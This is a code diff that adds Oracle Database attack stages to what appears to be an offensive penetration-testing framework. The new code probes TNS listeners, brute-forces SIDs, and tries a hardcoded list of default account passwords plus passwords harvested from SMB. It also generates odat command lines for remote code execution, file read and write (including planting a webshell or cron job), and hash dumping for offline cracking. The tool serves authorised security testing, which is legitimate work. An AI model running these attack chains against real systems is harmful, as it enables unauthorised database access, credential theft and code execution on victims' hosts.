@@ -2480,6 +2480,36 @@ def _extract_finding(sid: str, output: str) -> "dict | None":
                     "summary": f"MySQL: {mv.group(1).strip()}"[:140]}
         return None
 
+    # 2bg4) oracle-creds: default/reused account worked → DB access (DBA flagged)
+    if sid == "oracle-creds":
+        hits = re.findall(r"^✗ CREDS (.+)$", output, re.M)
+        if not hits:
+            return None
+        shown = "; ".join(h.strip() for h in hits[:3]) + (f" +{len(hits) - 3}" if len(hits) > 3 else "")
+        risk = "CRITICAL" if "(DBA)" in output else "HIGH"
+        return {"state": "VULNERABLE", "cve": cve, "risk": risk,
+                "summary": f"Oracle creds: {shown}"[:140]}
+
+    # 2bg3) oracle-sid: SID / service name discovered (needed to attack)
+    if sid == "oracle-sid":
+        sids = re.findall(r"^✗ SID (\S+)", output, re.M)
+        if not sids:
+            return None
+        return {"state": "EXPOSED", "cve": cve, "risk": "MEDIUM",
+                "summary": f"Oracle SID(s): {', '.join(sids[:6])}"[:140]}
+
+    # 2bg2) oracle-tns: unauthenticated status leak (exposed) → else version disclosure (info)
+    if sid == "oracle-tns":
+        if re.search(r"^✗ STATUS leak", output, re.M):
+            ml = re.search(r"exposed unauthenticated:\s*(.+)$", output, re.M)
+            return {"state": "EXPOSED", "cve": cve, "risk": "MEDIUM",
+                    "summary": f"Oracle TNS status leak: {(ml.group(1) if ml else '').strip()}"[:140]}
+        mv = re.search(r"^\[\*\] Service:\s*(.+)$", output, re.M)
+        if mv:
+            return {"state": "INFO", "cve": cve, "risk": "LOW",
+                    "summary": f"Oracle: {mv.group(1).strip()}"[:140]}
+        return None
+
     # 2bh6) psql-shell: a reverse shell was fired through COPY … FROM PROGRAM
     if sid == "psql-shell":
         if "shell → " in output:
@@ -3597,11 +3627,10 @@ _EXPLOIT_STEPS = {
         ("Manual steps & further research", "psql-next"),
     ],
     "oracle": [
-        "Enumerate the SID (oracle-sid-brute / odat sidguesser)",
-        "Brute default accounts (scott/tiger, system/manager, dbsnmp/dbsnmp) — odat passwordguesser",
-        "With creds → file read/write, privesc and RCE via odat (dbmsscheduler / externaltable)",
-        "TNS poisoning / version CVEs on older listeners",
-        "Manual steps & further research",
+        ("TNS listener probe → version + status/SID leak → searchsploit (stdlib + nmap)", "oracle-tns"),
+        ("Enumerate the SID / service name (TNS leak + nmap oracle-sid-brute)", "oracle-sid"),
+        ("Default + reused account brute against the SID (nmap oracle-brute, no lockout)", "oracle-creds"),
+        ("Manual steps & further research", "oracle-next"),
     ],
     "mqtt": [
         "Connect anonymously and subscribe to all topics (# wildcard) — sniff for data/creds",
@@ -15092,6 +15121,344 @@ def _tool_ldap_next(ip: str, port: int, proto: str) -> str:
     return "\n".join(L)
 
 
+# ══ Oracle Database (1521 …) ══ the TNS listener speaks a binary protocol and there is no sqlplus /
+# odat client guaranteed on the box, so the automated phase is stdlib TNS probing + nmap's Oracle NSE
+# (version, SID brute, default-account brute). Authenticated file-read / RCE go through odat + a valid
+# SID + creds and stay in the reference step (oracle-next). netexec has no oracle protocol.
+_TNS_CMD_TIMEOUT = 6.0
+_ORACLE_SID_DEADLINE = 180
+_ORACLE_CREDS_DEADLINE = 180
+# classic default account:password pairs — one password per account (no lockout, like smb-spray)
+_ORACLE_DEFAULTS = [
+    ("system", "manager"), ("sys", "change_on_install"), ("scott", "tiger"),
+    ("dbsnmp", "dbsnmp"), ("system", "oracle"), ("sys", "oracle"), ("oracle", "oracle"),
+    ("system", "admin"), ("hr", "hr"), ("outln", "outln"), ("mdsys", "mdsys"),
+    ("ctxsys", "ctxsys"), ("xdb", "xdb"), ("wksys", "wksys"), ("system", "manager1"),
+    ("sys", "sys"), ("apps", "apps"), ("system", "password"),
+]
+_ORACLE_DBA = {"sys", "system", "sysman", "dbsnmp"}
+
+
+def _tns_packet(command: str) -> bytes:
+    """Build a TNS Connect packet carrying a listener COMMAND (version / status / ping)."""
+    import struct
+    connect = f"(CONNECT_DATA=(COMMAND={command}))".encode()
+    body = struct.pack(">HHHHHHHHHHIBB",
+                       0x0136, 0x012c, 0x0000, 0x0800, 0x7fff, 0x7f08, 0x0000,
+                       0x0001, len(connect), 0x003a, 0x00000000, 0x01, 0x00)
+    body += b"\x00" * 24 + connect                          # pad to connect-data offset 0x3a (58)
+    header = struct.pack(">HHBBH", 8 + len(body), 0x0000, 0x01, 0x00, 0x0000)
+    return header + body
+
+
+def _tns_command(ip: str, port: int, command: str, timeout: float = _TNS_CMD_TIMEOUT) -> str:
+    """Send a TNS listener COMMAND and return the decoded response text (or '' when the listener stays
+    silent). Old / unpatched listeners answer version & status in cleartext; patched ones still leak
+    the banner in the auth-required error. Read-only. Raises on a connection failure."""
+    import socket
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(timeout)
+    try:
+        try:
+            s.connect((ip, port))
+        except OSError as exc:
+            raise RuntimeError(f"no TNS listener on {ip}:{port} ({exc})")
+        s.sendall(_tns_packet(command))
+        chunks, end = [], time.time() + timeout
+        while time.time() < end:
+            try:
+                data = s.recv(4096)
+            except (socket.timeout, OSError):
+                break
+            if not data:
+                break
+            chunks.append(data)
+            if sum(len(c) for c in chunks) > 65535:
+                break
+        return b"".join(chunks).decode("latin-1", "replace")
+    finally:
+        try:
+            s.close()
+        except Exception:                                    # noqa: BLE001
+            pass
+
+
+def _tns_extract(text: str) -> dict:
+    """Pull version, service/SID names and auth-required state out of a TNS response."""
+    mv = re.search(r"Version (\d+(?:\.\d+){2,4})", text)
+    version = mv.group(1) if mv else None
+    svcs = set()
+    for pat in (r"\(SERVICE_NAME=([^)]+)\)", r"\(SID=([^)]+)\)", r"INSTANCE_NAME=([^)\s]+)",
+                r"\(GLOBAL_DBNAME=([^)]+)\)", r'(?:Instance|Service) "([^"]+)"'):
+        for mm in re.finditer(pat, text, re.I):
+            v = mm.group(1).strip()
+            if v and v.upper() not in ("PLSEXTPROC", "CLRECOTNS", "CLRExtProc".upper()):
+                svcs.add(v)
+    auth_req = bool(re.search(r"TNS-0118[89]|could not authenticate", text))
+    return {"version": version, "services": sorted(svcs), "auth_required": auth_req}
+
+
+def _tool_oracle_tns(ip: str, port: int, proto: str) -> str:
+    """Oracle step 1 tool: probe the TNS listener (pure stdlib) with the version + status commands —
+    old / unpatched listeners return the banner and even the live SID/service list in cleartext;
+    patched ones still leak the version in the auth-required error. Records the service, flags an
+    unauthenticated status leak (info disclosure / TNS-poison surface) and feeds searchsploit
+    (nmap oracle-tns-version fallback). Read-only, no login. Authorised targets only."""
+    ver_text = _tns_command(ip, port, "version")
+    status_text = _tns_command(ip, port, "status") + _tns_command(ip, port, "services")
+    info = _tns_extract(ver_text + "\n" + status_text)
+    version, services = info["version"], info["services"]
+
+    if not version and shutil.which("nmap"):
+        p = subprocess.run(["nmap", "-Pn", "-p", str(port), "--script", "oracle-tns-version", ip],
+                           capture_output=True, text=True, timeout=120)
+        mv = re.search(r"Version (\d+(?:\.\d+){2,4})", p.stdout or "")
+        if mv:
+            version = mv.group(1)
+
+    lines = []
+    if version:
+        save_services(ip, [{"port": port, "proto": proto, "name": "oracle",
+                            "product": "Oracle TNS listener", "version": version}])
+        lines.append(f"[*] Service: Oracle TNS listener {version}")
+        tuprel = tuple(int(x) for x in version.split(".")[:3])
+        if tuprel < (11, 2, 0):
+            lines.append("· pre-11.2 listener — remote registration usually open → CVE-2012-1675 "
+                         "(TNS Poison) likely; see oracle-next")
+    else:
+        lines.append("· no version leaked — listener may be patched/hardened; try nmap NSE / odat")
+    if services:
+        lines.append(f"✗ STATUS leak — SIDs/services exposed unauthenticated: {', '.join(services[:8])}")
+    elif info["auth_required"]:
+        lines.append("· status requires local auth (11g+ hardened) — enumerate the SID next (oracle-sid r2)")
+
+    if version and shutil.which("searchsploit"):
+        proc = subprocess.run(["searchsploit", "-j", "-s", "-t", "Oracle Database", version],
+                              capture_output=True, text=True, timeout=30)
+        try:
+            rows = json.loads(proc.stdout or "{}").get("RESULTS_EXPLOIT", [])
+        except ValueError:
+            rows = []
+        seen = set()
+        for r in rows[:20]:
+            edb = str(r.get("EDB-ID", "?"))
+            if edb in seen:
+                continue
+            seen.add(edb)
+            lines.append(f"[searchsploit] {(r.get('Title') or '').strip()}  (EDB-{edb})")
+            if len(seen) >= 8:
+                break
+    return f"Oracle TNS — {ip}:{port}\n\n" + "\n".join(lines)
+
+
+def _tool_oracle_sid(ip: str, port: int, proto: str) -> str:
+    """Oracle step 2 tool: discover the database SID / service name — first from any unauthenticated
+    TNS status leak (oracle-tns), then nmap oracle-sid-brute (dictionary of common SIDs). The SID is
+    the key that unlocks the account brute (oracle-creds) and odat. Found SIDs are recorded for the
+    next step. nmap required for the brute. Authorised targets only."""
+    sids = set()
+    tns_out = next((o for s, o in fetch_scripts(ip, port, proto) if s == "oracle-tns"), "")
+    ml = re.search(r"exposed unauthenticated:\s*(.+)$", tns_out, re.M)
+    if ml:
+        for v in ml.group(1).split(","):
+            if v.strip():
+                sids.add(v.strip())
+
+    if shutil.which("nmap"):
+        p = subprocess.run(["nmap", "-Pn", "-p", str(port), "--script", "oracle-sid-brute", ip],
+                           capture_output=True, text=True, timeout=_ORACLE_SID_DEADLINE)
+        block = re.search(r"oracle-sid-brute:\s*\n(.*?)(?:\n\n|\nNmap done|\Z)", p.stdout or "", re.S)
+        if block:
+            for ln in block.group(1).splitlines():
+                mm = re.match(r"^\|[_ ]*\s*([A-Za-z0-9_$]{1,30})\s*$", ln)
+                if mm and mm.group(1).upper() not in ("PLSEXTPROC",):
+                    sids.add(mm.group(1))
+    sids = sorted(sids)
+
+    lines = [f"[*] {len(sids)} SID/service name(s) discovered"]
+    for sid in sids[:20]:
+        lines.append(f"✗ SID {sid}")
+    if sids:
+        lines.append("· brute default accounts against a SID next (oracle-creds r3)")
+    else:
+        lines.append("· no SID found — try a bigger nmap oracle-sid-brute dict / odat sidguesser, "
+                     "or a leaked SID from the app / tnsnames.ora")
+    return f"Oracle SID — {ip}:{port}\n\n" + "\n".join(lines)
+
+
+def _gather_oracle_creds(ip: str) -> list:
+    """(user, pass) Oracle logins oracle-creds proved for this host ('oracle on <ip>')."""
+    out = []
+    for sid, output in fetch_scripts(ip, 445, "tcp"):
+        if sid != "smb-creds":
+            continue
+        for m in re.finditer(rf"! (\S+?):(\S*) @ oracle on {re.escape(ip)}\b", output or ""):
+            out.append((m.group(1), "" if m.group(2) == "<blank>" else m.group(2)))
+    return out
+
+
+def _tool_oracle_creds(ip: str, port: int, proto: str) -> str:
+    """Oracle step 3 tool: against each discovered SID, try the classic default account:password pairs
+    plus any harvested password (reuse) via nmap oracle-brute in creds-mode — one password per account,
+    so NO lockout (it never sprays many guesses at one account). Valid logins are saved to the store
+    ('oracle on <host>') and DBA accounts (SYS/SYSTEM) are flagged. Needs a SID (oracle-sid r2) + nmap.
+    Authorised targets only."""
+    import tempfile
+    if not shutil.which("nmap"):
+        raise RuntimeError("nmap required for the Oracle account check (oracle-brute)")
+    sid_out = next((o for s, o in fetch_scripts(ip, port, proto) if s == "oracle-sid"), "")
+    sids = re.findall(r"^✗ SID (\S+)", sid_out, re.M)
+    if not sids:
+        raise RuntimeError("no SID discovered — run oracle-sid (r2) first")
+
+    reused = [s for _d, _u, s in _gather_all_smb_creds()
+              if s and not re.fullmatch(r"[a-fA-F0-9]{32}", s)]
+    pairs, seen = [], set()
+    for u, p in _ORACLE_DEFAULTS + [(u, s) for s in reused for u in ("system", "sys", "dbsnmp", "scott")]:
+        if (u.lower(), p) not in seen:
+            seen.add((u.lower(), p))
+            pairs.append((u, p))
+
+    fd, credfile = tempfile.mkstemp(prefix="pshunter_ora_", suffix=".txt")
+    with os.fdopen(fd, "w") as fh:
+        fh.write("\n".join(f"{u}/{p}" for u, p in pairs))
+
+    valid, deadline = [], time.time() + _ORACLE_CREDS_DEADLINE
+    try:
+        for sid in sids[:3]:
+            if time.time() > deadline:
+                break
+            args = (f"oracle-brute.sid={sid},brute.mode=creds,brute.credfile={credfile},"
+                    "brute.threads=3")
+            p = subprocess.run(["nmap", "-Pn", "-p", str(port), "--script", "oracle-brute",
+                                "--script-args", args, ip],
+                               capture_output=True, text=True,
+                               timeout=int(max(30, deadline - time.time())))
+            for mm in re.finditer(r"([A-Za-z0-9_$]+):(\S*?) - Valid credentials", p.stdout or ""):
+                valid.append((sid, mm.group(1), mm.group(2)))
+    finally:
+        _safe_unlink(credfile)
+
+    if valid:                                                # persist to the canonical creds store
+        blocks = _load_manual_block(ip, 445, "tcp", "smb-creds")
+        for _sid, user, pw in valid:
+            line = f"! {user}:{pw or '<blank>'} @ oracle on {ip} [{ip}]"
+            blocks.setdefault(ip, [])
+            if line not in blocks[ip]:
+                blocks[ip].append(line)
+        _save_manual_block(ip, 445, "tcp", "smb-creds", blocks)
+
+    lines = [f"[*] {len(pairs)} pair(s) tried across {min(len(sids), 3)} SID(s) · {len(valid)} valid"]
+    for sid, user, pw in valid:
+        dba = "  (DBA)" if user.lower() in _ORACLE_DBA else ""
+        lines.append(f"✗ CREDS {user}:{pw or '<blank>'}{dba}  @ SID {sid}")
+    if valid:
+        lines.append("· with a DBA login → odat file R/W & RCE (oracle-next r4)")
+    else:
+        lines.append("· no default/reused login worked — odat passwordguesser (bigger dict), "
+                     "or reuse an app-config cred")
+    return f"Oracle credentials — {ip}:{port}\n\n" + "\n".join(lines)
+
+
+# ── Oracle step 4: manual steps & further research (reference only, context-aware) ─
+def _tool_oracle_next(ip: str, port: int, proto: str) -> str:
+    """Oracle step-4 tool: NOT a scan — a read-only checklist of where to go on Oracle (odat file
+    read/write & RCE, TNS poisoning, privesc, CVEs), with this host's findings substituted in
+    (version, SIDs, valid creds, unconfirmed ⚠). Pure DB synthesis; no network. Exploitation needs
+    odat + a SID + a valid cred, which is why it stays a reference rather than an automated step."""
+    scripts = fetch_scripts(ip, port, proto)
+    by_sid = {}
+    for sid, out in scripts:
+        by_sid.setdefault(sid, out or "")
+    tns, sidout, credout = by_sid.get("oracle-tns", ""), by_sid.get("oracle-sid", ""), by_sid.get("oracle-creds", "")
+
+    mv = re.search(r"^\[\*\] Service:\s*(.+)$", tns, re.M)
+    ver = mv.group(1).strip() if mv else ""
+    sids = re.findall(r"^✗ SID (\S+)", sidout, re.M)
+    creds = _gather_oracle_creds(ip)
+    dba = [f"{u}:{p}" for u, p in creds if u.lower() in _ORACLE_DBA]
+    sid1 = sids[0] if sids else "<SID>"
+    u1, p1 = (creds[0] if creds else ("<user>", "<pass>"))
+
+    oports = {(pp, pr) for pp, pr, _s in fetch_ports(ip)}
+    reuse_svc = [n for (pnum, n) in ((22, "SSH"), (445, "SMB"), (1521, "other Oracle"))
+                 if (pnum, "tcp") in oports]
+
+    kev = _load_kev()
+    found = set()
+    for (pp, pr, _sc, _st, cv, _rk, _sm) in fetch_vulns(ip):
+        if pp == port and pr == proto and cv:
+            found |= {c.strip() for c in cv.split(",") if c.strip()}
+    for _sid, out in scripts:
+        found |= set(re.findall(r"CVE-\d{4}-\d{3,7}", out or ""))
+    found = sorted(found, key=_cve_sort_key)
+
+    warns = []
+    for sid, out in scripts:
+        for ln in (out or "").splitlines():
+            if ln.strip().startswith("⚠"):
+                warns.append(f"{DIM}[{sid}]{RESET} {ln.strip()}")
+    warns = warns[:14]
+
+    sub = (f"{DIM}version: {ver or 'unknown'}  ·  SIDs: {len(sids)}  ·  creds: {len(creds)}  ·  "
+           f"DBA: {'yes' if dba else 'no'}")
+    L = [f"Oracle {ip} — manual steps {DIM}(reference only — nothing is scanned here){RESET}", sub + RESET]
+
+    L.append(f"\n{BOLD}A. Get code exec (odat — needs a SID + cred){RESET}")
+    if dba:
+        L.append(f"  {CYAN}DBA {dba[0]}{RESET} {DIM}→ odat externaltable -s {ip} -p {port} -U {u1} -P {p1} "
+                 f"-d {sid1} --exec … / odat dbmsscheduler / odat java{RESET}")
+    elif creds:
+        L.append(f"  {DIM}non-DBA cred → odat passwordguesser for a DBA account, then externaltable/"
+                 f"dbmsscheduler RCE{RESET}")
+    else:
+        L.append(f"  {DIM}need a cred first (oracle-creds r3); then odat all -s {ip} -p {port} "
+                 f"-d {sid1} for the full attack surface{RESET}")
+    L.append(f"  {DIM}install: pipx install odat (or git clone quentinhardy/odat); mysqld/oracle often "
+             f"runs privileged → OS command exec{RESET}")
+
+    L.append(f"\n{BOLD}B. File read / write (odat){RESET}")
+    if creds:
+        L.append(f"  {CYAN}cred{RESET} {DIM}→ odat utlfile -s {ip} -p {port} -U {u1} -P {p1} -d {sid1} "
+                 f"--getFile … (read /etc/passwd, tnsnames.ora); --putFile to write a webshell / cron{RESET}")
+    else:
+        L.append(f"  {DIM}odat utlfile read/write needs a valid cred (oracle-creds r3){RESET}")
+
+    L.append(f"\n{BOLD}C. Crack & reuse{RESET}")
+    if creds:
+        L.append(f"  {CYAN}creds:{RESET} {', '.join(f'{u}:{p}' for u, p in creds[:5])}"
+                 + (f" {DIM}+{len(creds) - 5}{RESET}" if len(creds) > 5 else ""))
+        L.append(f"  {DIM}dump password hashes: SELECT name,spare4/password FROM sys.user$ (DBA) → "
+                 f"hashcat -m 112 (11g SHA1) / -m 12300 (12c); reuse on {', '.join(reuse_svc) or 'SSH/SMB'}{RESET}")
+    else:
+        L.append(f"  {DIM}nothing proven yet — oracle-creds (r3){RESET}")
+
+    L.append(f"\n{BOLD}D. Listener / TNS attacks{RESET}")
+    L.append(f"  {DIM}TNS poisoning (CVE-2012-1675): register a rogue instance to MITM sessions on "
+             f"listeners with open registration; set a listener password / VALID_NODE_CHECKING to fix{RESET}")
+
+    L.append(f"\n{BOLD}E. CVEs surfaced in this phase{RESET}")
+    if found:
+        for c in found:
+            ktag = f"  {RED}KEV{RESET}" if c in kev else ""
+            L.append(f"  {c}{ktag}  {DIM}https://nvd.nist.gov/vuln/detail/{c}{RESET}")
+    else:
+        L.append(f"  {DIM}none surfaced — CVE-2012-1675 (TNS Poison), CVE-2012-3137 (O5LOGON hash leak); "
+                 f"searchsploit '{ver or 'Oracle <version>'}'{RESET}")
+
+    L.append(f"\n{BOLD}F. Verify unconfirmed findings from this phase{RESET}")
+    if warns:
+        for w in warns:
+            L.append(f"  {w}")
+    else:
+        L.append(f"  {DIM}none flagged — nothing sat on the fence{RESET}")
+
+    L.append(f"\n{BOLD}G. Re-run & housekeeping{RESET}")
+    L.append(f"  {DIM}crack sys.user$ hashes then reuse; remove any odat --putFile webshell / cron you "
+             f"planted (Oracle won't clean it up for you){RESET}")
+    return "\n".join(L)
+
+
 # ══ Privilege Escalation phase 1: spawn a shell ══ one place to land a foothold, whatever the
 # service surfaced. A router: it detects which of this host's services have a viable path to a
 # shell (from findings already in the DB) and dispatches to that service's existing foothold tool
@@ -15256,6 +15623,10 @@ _STEP_TOOLS = {
     "psql-rce": ("COPY … FROM PROGRAM command exec → exec-verified RCE (superuser)", _tool_psql_rce),
     "psql-shell": ("PostgreSQL foothold → reverse shell via COPY … FROM PROGRAM (spawned)", _tool_psql_shell),
     "psql-next": ("manual PostgreSQL steps (context-aware, reference only)", _tool_psql_next),
+    "oracle-tns": ("Oracle TNS listener probe → version + status/SID leak (stdlib + nmap)", _tool_oracle_tns),
+    "oracle-sid": ("Oracle SID / service-name enumeration (TNS leak + nmap oracle-sid-brute)", _tool_oracle_sid),
+    "oracle-creds": ("Oracle default/reused account brute per SID (nmap oracle-brute, no lockout)", _tool_oracle_creds),
+    "oracle-next": ("manual Oracle steps (context-aware, reference only)", _tool_oracle_next),
     "mssql-banner": ("MSSQL fingerprint — SQL Browser 1434 / TDS pre-login → version (stdlib)", _tool_mssql_banner),
     "mssql-creds": ("sa blank/default + reused creds (netexec mssql, flags sysadmin)", _tool_mssql_creds),
     "mssql-exec": ("xp_cmdshell command exec confirm (netexec -x, sysadmin)", _tool_mssql_exec),
@@ -15364,6 +15735,10 @@ _STEP_TOOL_RUNS = {
     "psql-rce":         ("psql CLI (COPY PROGRAM)", f"{_mins(_PGRCE_DEADLINE)} min"),
     "psql-shell":       ("Python (smart listener)", None),
     "psql-next":        ("reference · no scan", None),
+    "oracle-tns":       ("Python (raw TNS) + nmap/searchsploit", None),
+    "oracle-sid":       ("nmap oracle-sid-brute", f"{_mins(_ORACLE_SID_DEADLINE)} min"),
+    "oracle-creds":     ("nmap oracle-brute", f"{_mins(_ORACLE_CREDS_DEADLINE)} min"),
+    "oracle-next":      ("reference · no scan", None),
     "mssql-banner":     ("Python (stdlib) + searchsploit", None),
     "mssql-creds":      ("netexec mssql", f"{_mins(_MSSQLCREDS_DEADLINE)} min"),
     "mssql-exec":       ("netexec mssql -x", None),
@@ -15457,7 +15832,7 @@ def _run_step_tool(ip: str, target: tuple, n: int) -> None:
         return
     tlabel, runner = _STEP_TOOLS[tool_key]
 
-    if tool_key in ("foothold", "next-steps", "smb-foothold", "smb-next", "winrm-shell", "winrm-next", "ftp-foothold", "ftp-next", "tftp-next", "telnet-next", "mysql-next", "psql-next", "mssql-next", "ssh-next", "ldap-next"):  # foreground: interactive / print-now
+    if tool_key in ("foothold", "next-steps", "smb-foothold", "smb-next", "winrm-shell", "winrm-next", "ftp-foothold", "ftp-next", "tftp-next", "telnet-next", "mysql-next", "psql-next", "oracle-next", "mssql-next", "ssh-next", "ldap-next"):  # foreground: interactive / print-now
         prev = fetch_step_status(ip, port, proto, key).get(n)
         set_step_status(ip, port, proto, key, n, "running")
         try:
@@ -15466,7 +15841,7 @@ def _run_step_tool(ip: str, target: tuple, n: int) -> None:
             print(f"{RED}✗ {tool_key} error: {exc}{RESET}")
             set_step_status(ip, port, proto, key, n, prev)
             return
-        if tool_key in ("next-steps", "smb-next", "winrm-next", "ftp-next", "tftp-next", "telnet-next", "mysql-next", "psql-next", "mssql-next", "ssh-next", "ldap-next"):  # a list to read now, not a scan result
+        if tool_key in ("next-steps", "smb-next", "winrm-next", "ftp-next", "tftp-next", "telnet-next", "mysql-next", "psql-next", "oracle-next", "mssql-next", "ssh-next", "ldap-next"):  # a list to read now, not a scan result
             print("\n" + out)
             out = re.sub(r"\x1b\[[0-9;]*m", "", out)           # store clean text (no ANSI) in DETAILS
         save_scripts(ip, [{"id": tool_key, "port": port, "proto": proto, "output": out}])
